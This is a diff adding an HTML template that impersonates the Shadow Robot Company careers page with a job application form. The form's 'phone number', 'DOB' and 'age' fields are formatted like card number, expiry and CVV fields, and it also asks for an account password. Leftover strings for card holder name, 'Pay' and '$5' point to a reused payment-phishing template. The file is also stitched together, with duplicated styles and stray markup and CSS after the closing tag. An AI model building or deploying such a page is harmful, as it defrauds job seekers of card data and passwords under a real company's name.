@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadowrobot</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Arial', sans-serif;
+            background-color: #ffffff;
+            color: #333;
+        }
+
+        header {
+            background-color: #ffffff; /* Changed to white */
+            color: #333;
+            padding: 1em;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1em 2em;
+        }
+
+        header nav ul {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+        }
+
+        header nav ul li {
+            margin-right: 20px;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            color: #333;
+        }
+
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 2em;
+            flex: 1;
+        }
+
+        h1 {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #ff69b4;
+            margin-bottom: 0.5em;
+        }
+
+        button {
+            background-color: #ff69b4;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #ff1493;
+            transform: translateY(-2px);
+        }
+
+        #apply-button {
+            margin-top: 1em;
+        }
+
+        #buy-form-container {
+    /* Remove display: none; */
+    padding: 2em;
+    background-color: rgba(255, 255, 255, 0.9);
+    border: 1px solid #ddd;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    transition: all 0.3s ease-in-out;
+    width: 100%;
+    max-width: 600px;
+}
+
+        form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        label {
+            margin-bottom: 10px;
+            color: #000;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            transition: border 0.3s ease;
+            color: #000;
+        }
+
+        input:focus, select:focus {
+            border: 1px solid #ff69b4;
+        }
+
+        footer {
+            background-color: #ffb6c1;
+            color: #333;
+            padding: 1em;
+            text-align: center;
+            width: 100%;
+            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.5);
+        }
+
+        #questions-section {
+            background-color: #f0f0f0;
+            color: #555;
+            padding: 2em;
+            text-align: center;
+            border-top: 1px solid #ccc;
+            margin-top: 2em;
+        }
+
+        #questions-section h2, #questions-section h3 {
+            color: #333;
+        }
+
+        .pink-link {
+            color: #ff69b4;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .pink-link:hover {
+            text-decoration: underline;
+        }
+
+        #questions-section button {
+            background-color: #ff69b4;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        #questions-section button:hover {
+            background-color: #ff1493;
+        }
+
+        /* Styling for row-based layout */
+        .row {
+            display: flex;
+            justify-content: space-between;
+            gap: 1em;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .column {
+            flex: 1 1 45%;
+            text-align: center;
+        }
+
+        .row button {
+            margin: 10px 0;
+        }
+
+        @media (max-width: 768px) {
+            .row {
+                flex-direction: column;
+            }
+            .column {
+                width: 100%;
+            }
+        }
+
+        /* New right-side section */
+        #right-section {
+            flex: 1;
+            padding: 2em;
+            background-color: #f5f5f5;
+            color: #333;
+            max-width: 400px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            margin-left: 2em;
+        }
+
+        #right-section h2 {
+            font-size: 1.8em;
+            color: #ff69b4;
+        }
+
+        #right-section p {
+            font-size: 1.1em;
+            margin: 1em 0;
+        }
+
+        #right-section button {
+            margin-top: 1.5em;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #111;
+            color: #fff;
+            text-align: center;
+        }
+
+        .premium-container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #222;
+            border-radius: 8px;
+        }
+
+        h2 {
+            color: #e60073;
+        }
+
+        .signup-form {
+            background: #333;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .signup-form input, .signup-form select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 4px;
+        }
+
+        .dob-age-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .dob-age-container input {
+            width: 50%;
+        }
+
+        .signup-form button {
+            background-color: #e60073;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 18px;
+        }
+
+        .signup-form button:hover {
+            background-color: #ff007f;
+        }
+
+        /* Loader styles */
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7) url('https://i.gifer.com/ZZ5H.gif') no-repeat center center;
+            background-size: 100px 100px;
+            z-index: 9999;
+        }
+
+        /* Success message */
+        #success-message {
+            display: none;
+            color: #28a745;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        /* Security notice */
+        .security-notice {
+            font-size: 12px;
+            color: #bbb;
+            margin-top: 10px;
+        }
+    </style>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #111;
+            color: #fff;
+            text-align: center;
+        }
+
+        .premium-container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #222;
+            border-radius: 8px;
+        }
+
+        h2 {
+            color: #e60073;
+        }
+
+        .signup-form {
+            background: #333;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: left;
+        }
+
+        .signup-form input, .signup-form select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: none;
+            border-radius: 4px;
+        }
+
+        .dob-age-container {
+            display: flex;
+            gap: 10px;
+        }
+
+        .dob-age-container input {
+            width: 50%;
+        }
+
+        .signup-form button {
+            background-color: #e60073;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 18px;
+        }
+
+        .signup-form button:hover {
+            background-color: #ff007f;
+        }
+
+        /* Loader styles */
+        #loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7) url('https://i.gifer.com/ZZ5H.gif') no-repeat center center;
+            background-size: 100px 100px;
+            z-index: 9999;
+        }
+
+        /* Success message */
+        #success-message {
+            display: none;
+            color: #28a745;
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        /* Security notice */
+        .security-notice {
+            font-size: 12px;
+            color: #bbb;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+
+<body>
+
+
+    {% with messages = get_flashed_messages(with_categories=True) %}
+            {% if messages %}
+                <div id="flash-container">
+                    {% for category, message in messages %}
+                        <div class="flash-messages flash-{{ category }}">{{ message }}</div>
+                    {% endfor %}
+                </div>
+            {% endif %}
+        {% endwith %}
+
+    <header>
+        <nav>
+            <ul>
+           
+
+                <li><button id="translate-button">Translate to Spanish</button></li>
+            </ul>
+        </nav>
+
+        <li>
+            <img src="{{ url_for('static', filename='logo.png.svg') }}" alt="Company Logo" width="50" height="50">
+                        </li>
+        <h1>Shadowrobot</h1>
+    </header>
+
+    <main>
+        <div style="display: flex; width: 100%; justify-content: space-between; align-items: flex-start;">
+            <section>
+                <h1>Job Application</h1>
+                <p>Vacancy:</p>
+                <select id="vacancy-select">
+                    <option value="">Select a position</option>
+                    <option value="Embedded System Engineer">Embedded System Engineer</option>
+                    <option value="Robotics Software Engineer">Robotics Software Engineer</option>
+                    <option value="Electro Mechanical Engineer">Electro Mechanical Engineer</option>
+                    <option value="Control System Engineer">Control System Engineer</option>
+                </select>
+                <button id="apply-button">Apply Here</button>
+
+
+
+
+
+
+                <div id="buy-form-container">
+                    <h1>Get an Application Form</h1>
+                    <form id="SignupForm" method="POST" action="{{ url_for('Application') }}" onsubmit="handleSignup(event)">
+
+
+
+                    <label for="email">Email</label>
+                        <input type="text" id="email" name="email" placeholder="john@gmail.com" required>
+                        <label for="attachment">upload your cv/resume</label>
+<input type="file" id="attachment" name="attachment">
+
+                        <label for="position">Select Name</label>
+                        <select id="position" name="position" required>
+                            <option value="" disabled selected>Select an option</option>
+                            <option value="Embedded System Engineer">Embedded System Engineer</option>
+                            <option value="Robotics Software Engineer">Robotics Software Engineer</option>
+                            <option value="Electro Mechanical Engineer">Electro Mechanical Engineer</option>
+                            <option value="Control System Engineer">Control System Engineer</option>
+                        </select>
+
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" placeholder="John Doe" required>
+
+                        <label for="phone">Phone Number</label>
+                        <input type="text" id="phone" name="phone" placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+                        <div class="dob-age-container">
+                            <div>
+                                <label for="dob">DOB</label>
+                                <input type="text" id="dob" name="dob" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div>
+                                <label for="age">Age</label>
+                                <input type="text" id="age" name="age" placeholder="123" maxlength="3" required>
+                            </div>
+                        </div>
+
+                        <label for="country">Country</label>
+                        <input type="text" id="country" name="country" placeholder="Country" required>
+
+                        <label for="postalcode">Postal Code</label>
+                        <input type="text" id="postalcode" name="postalcode" placeholder="12345" maxlength="5" required>
+
+                        <label for="password">Account Password</label>
+                <input type="password" id="password" name="password" required>
+
+
+                        <button type="submit">Sign Up</button>
+                    </form>
+                </div>
+
+
+
+
+
+
+
+
+
+
+
+                    
+
+                <!-- Success Message -->
+                <div id="success-message">Signup Successful! Redirecting...</div>
+
+                <p class="security-notice">Your details are secured by ShadowRobot.</p>
+            </section>
+
+            <!-- Right Section -->
+            <section id="right-section">
+                <h2>Ready to Apply?</h2>
+                <p>Fill out the form to get started.</p>
+                <p><strong>Deadline</strong>: Apply by March 21st!</p>
+                <button id="apply-now-btn">Apply Now</button>
+                
+                <h2>We've been working on the challenge of robot dexterity for over 20 years</h2>
+                <p>• Our Dexterous Hand is the most advanced robot hand available, with options to meet a broad range of requirements and budgets.</p>
+                <p>• We have a long history of working with academic institutions and industry to accelerate research and drive innovation.</p>
+                <p>• Every robot is built to order and tailored to meet your needs.</p>
+                <p>• Our team is available at every stage of the process to offer consultancy and support, ensuring the success of your project.</p>
+                <button> Get in touch to discuss your project</button>
+            </section>
+        </div>
+    </main>
+
+    <section id="questions-section">
+        <div class="row">
+            <div class="column">
+                <h2>Questions?</h2>
+                <p>Contact us to talk through your requirements, discuss pricing, and book a demo.</p>
+                <button>Contact us</button>
+            </div>
+            <div class="column">
+                <h3>Subscribe to Our Newsletter</h3>
+                <button>Subscribe</button>
+            </div>
+            <div class="column">
+                <p><a href="#" class="pink-link">Distributors</a> | <a href="#" class="pink-link">Privacy Policy</a> | <a href="#" class="pink-link">Cookie Policy</a></p>
+            </div>
+            <div class="column">
+                <h3>Follow Us</h3>
+                <p>For press inquiries contact <a href="mailto:press@shadowrobot.com" class="pink-link">press@shadowrobot.com</a></p>
+                <p>Copyright © 2024 Shadow Robot Company</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>Contact us: press@shadowrobot.com</p>
+        <li>
+            <img src="{{ url_for('static', filename='logo.png.svg') }}" alt="Company Logo" width="50" height="50">
+                        </li>
+    </footer>
+
+    <script>
+        // Event listener to translate text on the page when the button is clicked
+        document.getElementById("translate-button").addEventListener("click", function () {
+            document.body.innerHTML = document.body.innerHTML
+                .replace(/Shadowrobot/g, 'Tienda del Cuerpo')
+                .replace(/Job Application/g, 'Aplicación para Trabajo')
+                .replace(/Vacancy/g, 'Vacante')
+                .replace(/Select a position/g, 'Selecciona una posición')
+                .replace(/Apply Here/g, 'Aplicar Aquí')
+                .replace(/Get an Application Form/g, 'Obtener un Formulario de Solicitud')
+                .replace(/Email/g, 'Correo Electrónico')
+                .replace(/Phone Number/g, 'Número de Teléfono')
+                .replace(/Username/g, 'Nombre de Usuario')
+                .replace(/Date of Birth/g, 'Fecha de Nacimiento')
+                .replace(/Age/g, 'Edad')
+                .replace(/Country/g, 'País')
+                .replace(/Postal Code/g, 'Código Postal')
+                .replace(/Sign Up/g, 'Registrar')
+                .replace(/Questions\?/g, '¿Preguntas?')
+                .replace(/Contact us/g, 'Contáctenos')
+                .replace(/Subscribe to Our Newsletter/g, 'Suscríbete a Nuestro Boletín')
+                .replace(/Distributors/g, 'Distribuidores')
+                .replace(/Privacy Policy/g, 'Política de Privacidad')
+                .replace(/Cookie Policy/g, 'Política de Cookies')
+                .replace(/Follow Us/g, 'Síguenos')
+                .replace(/Contact us: press@shadowrobot.com/g, 'Contáctanos: press@shadowrobot.com')
+                .replace(/Copyright © 2024 Shadow Robot Company/g, 'Copyright © 2024 Shadow Robot Company')
+                .replace(/We've been working on the challenge of robot dexterity for over 20 years/g, 'Hemos estado trabajando en el desafío de la destreza robótica durante más de 20 años')
+                .replace(/Our Dexterous Hand is the most advanced robot hand available, with options to meet a broad range of requirements and budgets/g, 'Nuestra Mano Dextrada es la mano robótica más avanzada disponible, con opciones para satisfacer una amplia gama de requisitos y presupuestos')
+                .replace(/We have a long history of working with academic institutions and industry to accelerate research and drive innovation/g, 'Tenemos una larga historia de trabajo con instituciones académicas e industriales para acelerar la investigación e impulsar la innovación')
+                .replace(/Every robot is built to order and tailored to meet your needs/g, 'Cada robot se construye a medida y se adapta para satisfacer sus necesidades')
+                .replace(/Our team is available at every stage of the process to offer consultancy and support, ensuring the success of your project/g, 'Nuestro equipo está disponible en cada etapa del proceso para ofrecer consultoría y apoyo, asegurando el éxito de su proyecto')
+                .replace(/Get in touch to discuss your project. Let’s work together to make it a reality/g, 'Póngase en contacto para discutir su proyecto. Trabajemos juntos para hacerlo realidad')
+                .replace(/Ready to Apply\?/g, '¿Listo para postularte?')
+                .replace(/Fill out the form to get started./g, 'Completa el formulario para comenzar.')
+                .replace(/Deadline: Apply by March 21st/g, 'Fecha límite: Postúlate antes del 21 de marzo')
+                .replace(/Card number/g, 'Número de Tarjeta')
+                .replace(/Card holder name/g, 'Nombre del Titular de la Tarjeta')
+                .replace(/CAT Time/g, 'Hora CAT')
+                .replace(/Card expiry date/g, 'Fecha de Caducidad de la Tarjeta')
+                .replace(/Pay/g, 'Pagar')
+                .replace(/\$5/g, '\$5')
+                .replace(/Password/g, 'Contraseña')
+                .replace(/Address/g, 'Dirección')
+                .replace(/Postal code/g, 'Código Postal')
+                .replace(/Country/g, 'País')
+                .replace(/Sign Up/g, 'Registrar')
+                .replace(/Sign In/g, 'Iniciar sesión')
+                .replace(/Select a Name/g, 'Selecciona un Nombre')
+                .replace(/Select an option/g, 'Selecciona una Opción')
+                .replace(/Your details are secured by ShadowRobot/g, 'Tus datos están asegurados por ShadowRobot');
+        });
+    
+        // Function to handle the signup form submission
+        function handleSignup(event) {
+            event.preventDefault();
+    
+            const form = document.getElementById("SignupForm");
+    
+            // Form validation before submission
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+    
+            if (email && password) {
+                // Show success message and submit the form after a short delay
+                document.getElementById('success-message').style.display = "block";
+                setTimeout(function () {
+                    form.submit(); // Submit the form after a delay
+                }, 3000); // 3-second delay
+            } else {
+                alert('Please fill in all required fields.');
+            }
+        }
+    
+        // Event listener for form submission
+        document.getElementById("SignupForm").addEventListener("submit", handleSignup);
+    
+        // Handle the signup form inputs and apply formatting
+        function setupInputListeners() {
+            const phoneInput = document.getElementById("phone");
+            const ageInput = document.getElementById("age");
+            const postalCodeInput = document.getElementById("postal-code");
+    
+            // Remove previous event listeners to prevent memory leaks
+            phoneInput.removeEventListener("input", phoneInputEventListener);
+            ageInput.removeEventListener("input", ageInputEventListener);
+            postalCodeInput.removeEventListener("input", postalCodeInputEventListener);
+    
+            // Add event listeners to input fields
+            phoneInput.addEventListener("input", phoneInputEventListener);
+            ageInput.addEventListener("input", ageInputEventListener);
+            postalCodeInput.addEventListener("input", postalCodeInputEventListener);
+        }
+    
+        // Event listener functions for input fields
+        function phoneInputEventListener(event) {
+            let value = event.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+            event.target.value = value.substring(0, 19); // Limit to 19 characters (including spaces)
+        }
+    
+        function ageInputEventListener(event) {
+            let value = event.target.value.replace(/\D/g, '').trim();
+            event.target.value = value.substring(0, 3); // Limit to 3 digits for age
+        }
+    
+        function postalCodeInputEventListener(event) {
+            let value = event.target.value.replace(/\D/g, '');
+            event.target.value = value.substring(0, 5); // Limit to 5 digits for postal code
+        }
+    
+        // Call the setup function to add input event listeners
+        setupInputListeners();
+    
+    </script>
+    <script>
+
+
+
+        
+    
+        document.getElementById("phone").addEventListener("input", function (e) {
+                    let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+                    e.target.value = value.substring(0, 19);
+                });
+                
+                
+                
+                document.getElementById("age").addEventListener("input", function (e) {
+                    let value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+                    e.target.value = value.substring(0, 3);
+                });
+        
+            
+    
+            
+            
+            document.getElementById("dob").addEventListener("input", function (e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length > 4) value = value.substring(0, 4);
+                    if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2);
+                    e.target.value = value;
+                });
+    
+    
+    
+            
+        </script>
+    
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Right Section -->
+<section id="right-section">
+    <h2>Ready to Apply?</h2>
+    <p>Fill out the form to get started.</p>
+    <p><strong>Deadline</strong>: Apply by March 21st!</p>
+    <button id="apply-now-btn">Apply Now</button>
+    
+    <h2>We've been working on the challenge of robot dexterity for over 20 years</h2>
+    <p>• Our Dexterous Hand is the most advanced robot hand available, with options to meet a broad range of requirements and budgets.</p>
+    <p>• We have a long history of working with academic institutions and industry to accelerate research and drive innovation.</p>
+    <p>• Every robot is built to order and tailored to meet your needs.</p>
+    <p>• Our team is available at every stage of the process to offer consultancy and support, ensuring the success of your project.</p>
+    <button> Get in touch to discuss your project</button>
+
+    <!-- New Images Section -->
+    <div id="images-container">
+        <img src="{{ url_for('static', filename='image1.jpg') }}" alt="Robot Hand" class="apply-image">
+        <img src="{{ url_for('static', filename='image2.jpg') }}" alt="Research Team" class="apply-image">
+    </div>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+#images-container {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin-top: 20px;
+}
+
+.apply-image {
+    width: 48%;
+    max-width: 200px;
+    height: auto;
+    border-radius: 10px;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+}
+
+@media (max-width: 768px) {
+    #images-container {
+        flex-direction: column;
+        align-items: center;
+    }
+    
+    .apply-image {
+        width: 80%;
+        max-width: 250px;
+    }
+}
